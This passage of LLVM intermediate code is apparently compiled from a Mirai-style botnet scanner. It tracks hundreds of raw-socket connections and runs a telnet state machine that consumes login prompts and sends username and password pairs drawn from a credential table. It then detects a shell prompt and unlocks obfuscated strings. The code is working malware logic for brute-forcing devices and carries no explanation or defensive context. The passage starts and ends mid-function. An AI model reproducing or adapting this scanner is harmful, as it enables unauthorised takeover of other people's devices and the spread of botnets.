  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %297
  br label %219

; <label>:305:                                    ; preds = %297
  %306 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 4
  %308 = load i16, i16* %307, align 4
  %309 = lshr i16 %308, 8
  %310 = and i16 %309, 1
  %311 = icmp ne i16 %310, 0
  br i1 %311, label %312, label %313

; <label>:312:                                    ; preds = %305
  br label %219

; <label>:313:                                    ; preds = %305
  %314 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 3
  %316 = load i32, i32* %315, align 4
  %317 = call i32 @ntohl(i32 %316) #9
  %318 = sub i32 %317, 1
  %319 = call i32 @htonl(i32 %318) #9
  %320 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 8
  %322 = load i32, i32* %321, align 4
  %323 = icmp ne i32 %319, %322
  br i1 %323, label %324, label %325

; <label>:324:                                    ; preds = %313
  br label %219

; <label>:325:                                    ; preds = %313
  store %struct.scanner_connection* null, %struct.scanner_connection** %25, align 8
  %326 = load i32, i32* %12, align 4
  store i32 %326, i32* %21, align 4
  br label %327

; <label>:327:                                    ; preds = %345, %325
  %328 = load i32, i32* %21, align 4
  %329 = icmp slt i32 %328, 628
  br i1 %329, label %330, label %348

; <label>:330:                                    ; preds = %327
  %331 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %332 = load i32, i32* %21, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %331, i64 %333
  %335 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %334, i32 0, i32 16
  %336 = load i32, i32* %335, align 8
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %338, label %344

; <label>:338:                                    ; preds = %330
  %339 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %340 = load i32, i32* %21, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %339, i64 %341
  store %struct.scanner_connection* %342, %struct.scanner_connection** %25, align 8
  %343 = load i32, i32* %21, align 4
  store i32 %343, i32* %12, align 4
  br label %348

; <label>:344:                                    ; preds = %330
  br label %345

; <label>:345:                                    ; preds = %344
  %346 = load i32, i32* %21, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %21, align 4
  br label %327

; <label>:348:                                    ; preds = %338, %327
  %349 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %350 = icmp eq %struct.scanner_connection* %349, null
  br i1 %350, label %351, label %352

; <label>:351:                                    ; preds = %348
  br label %364

; <label>:352:                                    ; preds = %348
  %353 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 8
  %355 = load i32, i32* %354, align 4
  %356 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %357 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %356, i32 0, i32 15
  store i32 %355, i32* %357, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = load i16, i16* %359, align 4
  %361 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %362 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %361, i32 0, i32 13
  store i16 %360, i16* %362, align 8
  %363 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %363)
  br label %219

; <label>:364:                                    ; preds = %351, %243
  br label %365

; <label>:365:                                    ; preds = %364
  %366 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %367 = getelementptr inbounds [16 x i64], [16 x i64]* %366, i64 0, i64 0
  %368 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %367) #7, !srcloc !3
  %369 = extractvalue { i64, i64* } %368, 0
  %370 = extractvalue { i64, i64* } %368, 1
  %371 = trunc i64 %369 to i32
  store i32 %371, i32* %27, align 4
  %372 = ptrtoint i64* %370 to i64
  %373 = trunc i64 %372 to i32
  store i32 %373, i32* %28, align 4
  br label %374

; <label>:374:                                    ; preds = %365
  br label %375

; <label>:375:                                    ; preds = %374
  %376 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %377 = getelementptr inbounds [16 x i64], [16 x i64]* %376, i64 0, i64 0
  %378 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %377) #7, !srcloc !4
  %379 = extractvalue { i64, i64* } %378, 0
  %380 = extractvalue { i64, i64* } %378, 1
  %381 = trunc i64 %379 to i32
  store i32 %381, i32* %29, align 4
  %382 = ptrtoint i64* %380 to i64
  %383 = trunc i64 %382 to i32
  store i32 %383, i32* %30, align 4
  br label %384

; <label>:384:                                    ; preds = %375
  store i32 0, i32* %1, align 4
  br label %385

; <label>:385:                                    ; preds = %509, %384
  %386 = load i32, i32* %1, align 4
  %387 = icmp slt i32 %386, 628
  br i1 %387, label %388, label %512

; <label>:388:                                    ; preds = %385
  %389 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %390 = load i32, i32* %1, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %389, i64 %391
  store %struct.scanner_connection* %392, %struct.scanner_connection** %10, align 8
  %393 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %394 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %393, i32 0, i32 16
  %395 = load i32, i32* %394, align 8
  %396 = icmp ugt i32 %395, 1
  %397 = select i1 %396, i32 30, i32 5
  store i32 %397, i32* %31, align 4
  %398 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %399 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %398, i32 0, i32 16
  %400 = load i32, i32* %399, align 8
  %401 = icmp ne i32 %400, 0
  br i1 %401, label %402, label %445

; <label>:402:                                    ; preds = %388
  %403 = load i32, i32* @fake_time, align 4
  %404 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %405 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %404, i32 0, i32 3
  %406 = load i32, i32* %405, align 4
  %407 = sub i32 %403, %406
  %408 = load i32, i32* %31, align 4
  %409 = icmp ugt i32 %407, %408
  br i1 %409, label %410, label %445

; <label>:410:                                    ; preds = %402
  %411 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %412 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %411, i32 0, i32 2
  %413 = load i32, i32* %412, align 8
  %414 = icmp eq i32 %413, -1
  br i1 %414, label %415, label %416

; <label>:415:                                    ; preds = %410
  br label %509

; <label>:416:                                    ; preds = %410
  %417 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %418 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %417, i32 0, i32 2
  %419 = load i32, i32* %418, align 8
  %420 = call i32 @close(i32 %419)
  %421 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %422 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %421, i32 0, i32 2
  store i32 -1, i32* %422, align 8
  %423 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %424 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %423, i32 0, i32 16
  %425 = load i32, i32* %424, align 8
  %426 = icmp ugt i32 %425, 2
  br i1 %426, label %427, label %439

; <label>:427:                                    ; preds = %416
  %428 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %429 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %428, i32 0, i32 9
  %430 = load i8, i8* %429, align 4
  %431 = add i8 %430, 1
  store i8 %431, i8* %429, align 4
  %432 = zext i8 %431 to i32
  %433 = icmp eq i32 %432, 10
  br i1 %433, label %434, label %436

; <label>:434:                                    ; preds = %427
  %435 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %435, i32 1)
  br label %438

; <label>:436:                                    ; preds = %427
  %437 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %437)
  br label %438

; <label>:438:                                    ; preds = %436, %434
  br label %444

; <label>:439:                                    ; preds = %416
  %440 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %441 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %440, i32 0, i32 9
  store i8 0, i8* %441, align 4
  %442 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %443 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %442, i32 0, i32 16
  store i32 0, i32* %443, align 8
  br label %444

; <label>:444:                                    ; preds = %439, %438
  br label %509

; <label>:445:                                    ; preds = %402, %388
  %446 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %447 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %446, i32 0, i32 16
  %448 = load i32, i32* %447, align 8
  %449 = icmp eq i32 %448, 1
  br i1 %449, label %450, label %476

; <label>:450:                                    ; preds = %445
  %451 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %452 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %451, i32 0, i32 2
  %453 = load i32, i32* %452, align 8
  %454 = srem i32 %453, 64
  %455 = zext i32 %454 to i64
  %456 = shl i64 1, %455
  %457 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %458 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %459 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %458, i32 0, i32 2
  %460 = load i32, i32* %459, align 8
  %461 = sdiv i32 %460, 64
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds [16 x i64], [16 x i64]* %457, i64 0, i64 %462
  %464 = load i64, i64* %463, align 8
  %465 = or i64 %464, %456
  store i64 %465, i64* %463, align 8
  %466 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %467 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %466, i32 0, i32 2
  %468 = load i32, i32* %467, align 8
  %469 = load i32, i32* %15, align 4
  %470 = icmp sgt i32 %468, %469
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %450
  %472 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %473 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %472, i32 0, i32 2
  %474 = load i32, i32* %473, align 8
  store i32 %474, i32* %15, align 4
  br label %475

; <label>:475:                                    ; preds = %471, %450
  br label %508

; <label>:476:                                    ; preds = %445
  %477 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %478 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %477, i32 0, i32 16
  %479 = load i32, i32* %478, align 8
  %480 = icmp ne i32 %479, 0
  br i1 %480, label %481, label %507

; <label>:481:                                    ; preds = %476
  %482 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %483 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %482, i32 0, i32 2
  %484 = load i32, i32* %483, align 8
  %485 = srem i32 %484, 64
  %486 = zext i32 %485 to i64
  %487 = shl i64 1, %486
  %488 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %489 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %490 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %489, i32 0, i32 2
  %491 = load i32, i32* %490, align 8
  %492 = sdiv i32 %491, 64
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds [16 x i64], [16 x i64]* %488, i64 0, i64 %493
  %495 = load i64, i64* %494, align 8
  %496 = or i64 %495, %487
  store i64 %496, i64* %494, align 8
  %497 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %498 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %497, i32 0, i32 2
  %499 = load i32, i32* %498, align 8
  %500 = load i32, i32* %14, align 4
  %501 = icmp sgt i32 %499, %500
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %481
  %503 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %504 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %503, i32 0, i32 2
  %505 = load i32, i32* %504, align 8
  store i32 %505, i32* %14, align 4
  br label %506

; <label>:506:                                    ; preds = %502, %481
  br label %507

; <label>:507:                                    ; preds = %506, %476
  br label %508

; <label>:508:                                    ; preds = %507, %475
  br label %509

; <label>:509:                                    ; preds = %508, %444, %415
  %510 = load i32, i32* %1, align 4
  %511 = add nsw i32 %510, 1
  store i32 %511, i32* %1, align 4
  br label %385

; <label>:512:                                    ; preds = %385
  %513 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %513, align 8
  %514 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %514, align 8
  %515 = load i32, i32* %15, align 4
  %516 = load i32, i32* %14, align 4
  %517 = icmp sgt i32 %515, %516
  br i1 %517, label %518, label %520

; <label>:518:                                    ; preds = %512
  %519 = load i32, i32* %15, align 4
  br label %522

; <label>:520:                                    ; preds = %512
  %521 = load i32, i32* %14, align 4
  br label %522

; <label>:522:                                    ; preds = %520, %518
  %523 = phi i32 [ %519, %518 ], [ %521, %520 ]
  %524 = add nsw i32 1, %523
  %525 = call i32 @select(i32 %524, %struct.__sigset_t* %8, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %11)
  %526 = call i64 @time(i64* null) #7
  %527 = trunc i64 %526 to i32
  store i32 %527, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %528

; <label>:528:                                    ; preds = %1149, %522
  %529 = load i32, i32* %1, align 4
  %530 = icmp slt i32 %529, 628
  br i1 %530, label %531, label %1152

; <label>:531:                                    ; preds = %528
  %532 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %533 = load i32, i32* %1, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %532, i64 %534
  store %struct.scanner_connection* %535, %struct.scanner_connection** %10, align 8
  %536 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %537 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %536, i32 0, i32 2
  %538 = load i32, i32* %537, align 8
  %539 = icmp eq i32 %538, -1
  br i1 %539, label %540, label %541

; <label>:540:                                    ; preds = %531
  br label %1149

; <label>:541:                                    ; preds = %531
  %542 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %543 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %544 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %543, i32 0, i32 2
  %545 = load i32, i32* %544, align 8
  %546 = sdiv i32 %545, 64
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds [16 x i64], [16 x i64]* %542, i64 0, i64 %547
  %549 = load i64, i64* %548, align 8
  %550 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %551 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %550, i32 0, i32 2
  %552 = load i32, i32* %551, align 8
  %553 = srem i32 %552, 64
  %554 = zext i32 %553 to i64
  %555 = shl i64 1, %554
  %556 = and i64 %549, %555
  %557 = icmp ne i64 %556, 0
  br i1 %557, label %558, label %592

; <label>:558:                                    ; preds = %541
  store i32 0, i32* %32, align 4
  store i32 4, i32* %33, align 4
  %559 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %560 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %559, i32 0, i32 2
  %561 = load i32, i32* %560, align 8
  %562 = bitcast i32* %32 to i8*
  %563 = call i32 @getsockopt(i32 %561, i32 1, i32 4, i8* %562, i32* %33) #7
  %564 = load i32, i32* %32, align 4
  %565 = icmp ne i32 %564, 0
  br i1 %565, label %566, label %577

; <label>:566:                                    ; preds = %558
  %567 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %568 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %567, i32 0, i32 2
  %569 = load i32, i32* %568, align 8
  %570 = call i32 @close(i32 %569)
  %571 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %572 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %571, i32 0, i32 2
  store i32 -1, i32* %572, align 8
  %573 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %574 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %573, i32 0, i32 9
  store i8 0, i8* %574, align 4
  %575 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %576 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %575, i32 0, i32 16
  store i32 0, i32* %576, align 8
  br label %1149

; <label>:577:                                    ; preds = %558
  %578 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %579 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %578, i32 0, i32 16
  store i32 2, i32* %579, align 8
  %580 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %581 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %580, i32 0, i32 1
  %582 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %581, i32 0, i32 0
  %583 = load i32, i32* %582, align 8
  %584 = icmp ne i32 %583, 0
  br i1 %584, label %589, label %585

; <label>:585:                                    ; preds = %577
  %586 = call %struct.scanner_auth* @random_auth_entry()
  %587 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %588 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %587, i32 0, i32 0
  store %struct.scanner_auth* %586, %struct.scanner_auth** %588, align 8
  br label %589

; <label>:589:                                    ; preds = %585, %577
  %590 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %591 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %590, i32 0, i32 4
  store i32 0, i32* %591, align 8
  br label %592

; <label>:592:                                    ; preds = %589, %541
  %593 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %594 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %595 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %594, i32 0, i32 2
  %596 = load i32, i32* %595, align 8
  %597 = sdiv i32 %596, 64
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds [16 x i64], [16 x i64]* %593, i64 0, i64 %598
  %600 = load i64, i64* %599, align 8
  %601 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %602 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %601, i32 0, i32 2
  %603 = load i32, i32* %602, align 8
  %604 = srem i32 %603, 64
  %605 = zext i32 %604 to i64
  %606 = shl i64 1, %605
  %607 = and i64 %600, %606
  %608 = icmp ne i64 %607, 0
  br i1 %608, label %609, label %1148

; <label>:609:                                    ; preds = %592
  br label %610

; <label>:610:                                    ; preds = %1146, %609
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %612 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %611, i32 0, i32 16
  %613 = load i32, i32* %612, align 8
  %614 = icmp eq i32 %613, 0
  br i1 %614, label %615, label %616

; <label>:615:                                    ; preds = %610
  br label %1147

; <label>:616:                                    ; preds = %610
  %617 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %617, i32 0, i32 4
  %619 = load i32, i32* %618, align 8
  %620 = icmp sgt i32 %619, 7168
  br i1 %620, label %621, label %633

; <label>:621:                                    ; preds = %616
  %622 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %623 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %622, i32 0, i32 7
  %624 = getelementptr inbounds [8192 x i8], [8192 x i8]* %623, i32 0, i32 0
  %625 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %626 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %625, i32 0, i32 7
  %627 = getelementptr inbounds [8192 x i8], [8192 x i8]* %626, i32 0, i32 0
  %628 = getelementptr inbounds i8, i8* %627, i64 6144
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %624, i8* %628, i64 2048, i32 1, i1 false)
  %629 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %630 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %629, i32 0, i32 4
  %631 = load i32, i32* %630, align 8
  %632 = sub nsw i32 %631, 6144
  store i32 %632, i32* %630, align 8
  br label %633

; <label>:633:                                    ; preds = %621, %616
  %634 = call i32* @__errno_location() #9
  store i32 0, i32* %634, align 4
  %635 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %636 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %635, i32 0, i32 2
  %637 = load i32, i32* %636, align 8
  %638 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %639 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %638, i32 0, i32 7
  %640 = getelementptr inbounds [8192 x i8], [8192 x i8]* %639, i32 0, i32 0
  %641 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %642 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %641, i32 0, i32 4
  %643 = load i32, i32* %642, align 8
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds i8, i8* %640, i64 %644
  %646 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %647 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %646, i32 0, i32 4
  %648 = load i32, i32* %647, align 8
  %649 = sub nsw i32 8192, %648
  %650 = call i32 @recv_strip_null(i32 %637, i8* %645, i32 %649, i32 16384)
  store i32 %650, i32* %34, align 4
  %651 = load i32, i32* %34, align 4
  %652 = icmp eq i32 %651, 0
  br i1 %652, label %653, label %655

; <label>:653:                                    ; preds = %633
  %654 = call i32* @__errno_location() #9
  store i32 104, i32* %654, align 4
  store i32 -1, i32* %34, align 4
  br label %655

; <label>:655:                                    ; preds = %653, %633
  %656 = load i32, i32* %34, align 4
  %657 = icmp eq i32 %656, -1
  br i1 %657, label %658, label %685

; <label>:658:                                    ; preds = %655
  %659 = call i32* @__errno_location() #9
  %660 = load i32, i32* %659, align 4
  %661 = icmp ne i32 %660, 11
  br i1 %661, label %662, label %684

; <label>:662:                                    ; preds = %658
  %663 = call i32* @__errno_location() #9
  %664 = load i32, i32* %663, align 4
  %665 = icmp ne i32 %664, 11
  br i1 %665, label %666, label %684

; <label>:666:                                    ; preds = %662
  %667 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %668 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %667, i32 0, i32 2
  %669 = load i32, i32* %668, align 8
  %670 = call i32 @close(i32 %669)
  %671 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %672 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %671, i32 0, i32 2
  store i32 -1, i32* %672, align 8
  %673 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %674 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %673, i32 0, i32 9
  %675 = load i8, i8* %674, align 4
  %676 = add i8 %675, 1
  store i8 %676, i8* %674, align 4
  %677 = zext i8 %676 to i32
  %678 = icmp sge i32 %677, 10
  br i1 %678, label %679, label %681

; <label>:679:                                    ; preds = %666
  %680 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %680, i32 1)
  br label %683

; <label>:681:                                    ; preds = %666
  %682 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %682)
  br label %683

; <label>:683:                                    ; preds = %681, %679
  br label %684

; <label>:684:                                    ; preds = %683, %662, %658
  br label %1147

; <label>:685:                                    ; preds = %655
  %686 = load i32, i32* %34, align 4
  %687 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %688 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %687, i32 0, i32 4
  %689 = load i32, i32* %688, align 8
  %690 = add nsw i32 %689, %686
  store i32 %690, i32* %688, align 8
  %691 = load i32, i32* @fake_time, align 4
  %692 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %693 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %692, i32 0, i32 3
  store i32 %691, i32* %693, align 4
  br label %694

; <label>:694:                                    ; preds = %1145, %685
  store i32 0, i32* %35, align 4
  %695 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %696 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %695, i32 0, i32 16
  %697 = load i32, i32* %696, align 8
  switch i32 %697, label %1104 [
    i32 2, label %698
    i32 3, label %706
    i32 4, label %723
    i32 5, label %740
    i32 6, label %779
    i32 7, label %828
    i32 8, label %846
    i32 9, label %859
    i32 10, label %904
    i32 12, label %934
    i32 11, label %982
    i32 13, label %1055
  ]

; <label>:698:                                    ; preds = %694
  %699 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %700 = call i32 @consume_iacs(%struct.scanner_connection* %699)
  store i32 %700, i32* %35, align 4
  %701 = icmp sgt i32 %700, 0
  br i1 %701, label %702, label %705

; <label>:702:                                    ; preds = %698
  %703 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %704 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %703, i32 0, i32 16
  store i32 3, i32* %704, align 8
  br label %705

; <label>:705:                                    ; preds = %702, %698
  br label %1105

; <label>:706:                                    ; preds = %694
  %707 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %708 = call i32 @consume_login_prompt(%struct.scanner_connection* %707, i32 1)
  store i32 %708, i32* %35, align 4
  %709 = icmp sgt i32 %708, 0
  br i1 %709, label %710, label %722

; <label>:710:                                    ; preds = %706
  %711 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %711, i32 0, i32 2
  %713 = load i32, i32* %712, align 8
  %714 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %715 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %714, i32 0, i32 0
  %716 = load %struct.scanner_auth*, %struct.scanner_auth** %715, align 8
  %717 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %716, i32 0, i32 0
  %718 = load i8*, i8** %717, align 8
  %719 = call i32 (i32, i8*, ...) @fdsend(i32 %713, i8* %718)
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %721 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %720, i32 0, i32 16
  store i32 4, i32* %721, align 8
  br label %722

; <label>:722:                                    ; preds = %710, %706
  br label %1105

; <label>:723:                                    ; preds = %694
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %725 = call i32 @consume_login_prompt(%struct.scanner_connection* %724, i32 0)
  store i32 %725, i32* %35, align 4
  %726 = icmp sgt i32 %725, 0
  br i1 %726, label %727, label %739

; <label>:727:                                    ; preds = %723
  %728 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %729 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %728, i32 0, i32 2
  %730 = load i32, i32* %729, align 8
  %731 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %732 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %731, i32 0, i32 0
  %733 = load %struct.scanner_auth*, %struct.scanner_auth** %732, align 8
  %734 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %733, i32 0, i32 1
  %735 = load i8*, i8** %734, align 8
  %736 = call i32 (i32, i8*, ...) @fdsend(i32 %730, i8* %735)
  %737 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %738 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %737, i32 0, i32 16
  store i32 5, i32* %738, align 8
  br label %739

; <label>:739:                                    ; preds = %727, %723
  br label %1105

; <label>:740:                                    ; preds = %694
  %741 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %742 = call i32 @consume_shell_prompt(%struct.scanner_connection* %741)
  store i32 %742, i32* %35, align 4
  %743 = icmp sgt i32 %742, 0
  br i1 %743, label %744, label %756

; <label>:744:                                    ; preds = %740
  call void @table_unlock_val(i8 zeroext 11)
  %745 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %746 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %745, i32 0, i32 2
  %747 = load i32, i32* %746, align 8
